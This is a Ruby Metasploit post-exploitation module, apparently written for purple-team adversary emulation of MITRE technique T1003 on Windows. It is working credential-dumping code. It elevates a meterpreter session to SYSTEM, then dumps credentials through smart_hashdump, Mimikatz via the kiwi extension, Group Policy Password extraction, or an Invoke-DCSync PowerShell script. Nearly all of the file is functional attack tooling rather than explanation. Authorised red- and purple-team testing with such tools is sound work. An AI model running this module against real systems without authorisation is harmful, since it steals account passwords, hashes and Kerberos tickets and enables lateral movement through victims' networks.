##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/kiwi'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Accounts
  include Msf::Post::Windows::Kiwi
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Credential Dumping (T1003) Windows - Purple Team',
                      'Description'   => %q{
                        Credential Access:
                        Credential dumping is the process of obtaining account login and password information from the operating system and software. Credentials can be used to perform Lateral Movement and access restricted information.

                        Tools may dump credentials in many different ways: extracting credential hashes for offline cracking, extracting plaintext passwords, and extracting Kerberos tickets, among others. Examples of credential dumpers include pwdump7, Windows Credential Editor, Mimikatz, and gsecdump. These tools are in use by both professional security testers and adversaries.

                        There are currently three modules to choose from:
                        (1) smart_hashdump - post/windows/gather/smart_hashdump
                        (2) Mimikatz - post/windows/gather/credentials/sso
                        (3) Group Policy Password - post/windows/gather/credentials/gpp
                        },
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1003' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptInt.new("MODULE", [ true, "Module to execute (1 - hashdump, 2 - mimikatz, 3 - GPP, 4 - DCSync)", 1])
    ])
  end

  def run_module(mod)
      framework_mod = framework.modules.create(mod)
      framework_mod.datastore['SESSION'] = datastore['SESSION']
      framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
      framework_mod.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
      if mod == 'post/windows/gather/smart_hashdump'
        framework_mod.datastore['GETSYSTEM'] = 'true'
      end
      framework_mod.run_simple(
          'LocalInput' => self.user_input,
          'LocalOutput' => self.user_output,
          'RunAsJob'  => false)
  end

  def exec_cmd(cmd)
    request = Packet.create_request('kiwi_exec_cmd')
    request.add_tlv(TLV_TYPE_KIWI_CMD, cmd)
    response = client.send_request(request)
    output = response.get_tlv_value(TLV_TYPE_KIWI_CMD_RESULT)
    # remove the banner up to the prompt
    output = output[output.index('mimikatz(powershell) #') + 1, output.length]
    # return everything past the newline from here
    output[output.index("\n") + 1, output.length]
  end

  def getsystem
    results = session.priv.getsystem
    if results[0]
      return true
    else
      return false
    end
  end

  def run

    return 0 if session.type != "meterpreter"

    unless is_admin?
      print_error("Module T1003W execution failed.")
      fail_with(Failure::NoAccess, "The current session does not have administrative rights.")
    end

    if getsystem
      print_good("Got SYSTEM privileges")
    else
     print_error("Could not obtain SYSTEM privileges")
     return
    end

    num = datastore['MODULE']
    case num
    when 1
      mod = 'post/windows/gather/smart_hashdump'
    when 2
      print_status("Loading kiwi extension...")
      return unless load_kiwi
      session.core.use("kiwi")
      print_status("Kiwi extension loaded...")
      #output = client.kiwi.creds_all
      #client.kiwi.exec_cmd("sekurlsa::logon_passwords")
      data = session.kiwi.creds_all
      print_status("Data collected")
      data.each do |line|
        print_status(line.inspect)
      end
      #session.kiwi.creds_all do |l|
      #  print_status(l)
      #end
      print_good("Module T1003w execution successful.")
      return
    when 3
      mod = 'post/windows/gather/credentials/gpp'
    when 4
      data = client.powershell.import_file({:file=>'data/purple/t1003/Invoke-DCSync.ps1'})
      print_status(data)
      print_good("Module T1003w execution successful.")
      return
    else
      fail_with(Failure::Unknown, "Unknown module selected")
    end
    begin
        print_status("Executing '#{mod}' on #{session.inspect}")
        run_module(mod)
        print_good("Module T1003W execution successful.")
    rescue ::Exception => e
        print_error(e.message)
        print_error("Module T1003W execution failed.")
        return
    end
   end
end
